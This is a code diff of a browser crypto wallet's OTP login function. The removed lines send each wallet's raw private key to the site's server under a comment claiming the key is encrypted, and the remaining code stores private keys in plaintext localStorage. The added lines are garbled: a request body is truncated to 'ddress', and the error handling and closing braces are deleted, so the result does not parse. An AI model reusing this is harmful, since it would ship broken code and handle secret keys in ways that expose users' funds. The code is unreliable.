@@ -1326,7 +1326,7 @@ async function verifyOTP(){
     if(privateKey){try{wallet=new ethers.Wallet(privateKey,provider);}catch{wallet=ethers.Wallet.createRandom().connect(provider);isNew=true;}}
     else{wallet=ethers.Wallet.createRandom().connect(provider);isNew=true;}
     localStorage.setItem('nan_wallet_'+otpEmail,wallet.privateKey);
-    fetch('/api/otp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'save',email:otpEmail,otp:'',privateKey:wallet.privateKey,walletAddress:wallet.address})}).catch(()=>{});
+    fetch('/api/otp',{method:'POST',headers:{'Content-Type':'application/json'},ddress:wallet.address})}).catch(()=>{});
     signer=wallet;userAddr=wallet.address;isCircleWallet=true;onArcNetwork=true;
     document.getElementById('otpBox').style.display='none';
     if(isNew){showSeedPhrase(wallet.mnemonic?.phrase||null,wallet.privateKey,wallet.address);}
@@ -1403,26 +1403,20 @@ async function verifyOTP(){
       isCircleWallet=true;
       localStorage.setItem('nan_wallet_'+otpEmail,wallet.privateKey);
 
-      if(isNewWallet){
-        // Save encrypted key to server for cross-device access
+      
+        
         await fetch('/api/otp',{
           method:'POST',headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({action:'save',email:otpEmail,otp:'',privateKey:wallet.privateKey,walletAddress:wallet.address}),
+          body:JSON.stringify({action:'save',email:otpEmail,otp:'',ddress:wallet.address}),
         });
         
-        // Show seed phrase ONLY for new users
+        
         
       
-        await onConnected(true, false);
+        
       
 
-    }else{toast(data.error||'Wrong code — try again','error',5000);}
-  }catch(e){
-    console.error('verifyOTP error:',e);
-    toast('Network error — is the server running?','error');
-  }
-  btn.innerHTML='Verify →';btn.disabled=false;
-}
+    
 
 // ── Show seed phrase modal to new users ──
 function showSeedPhrase(mnemonic, privateKey, address){
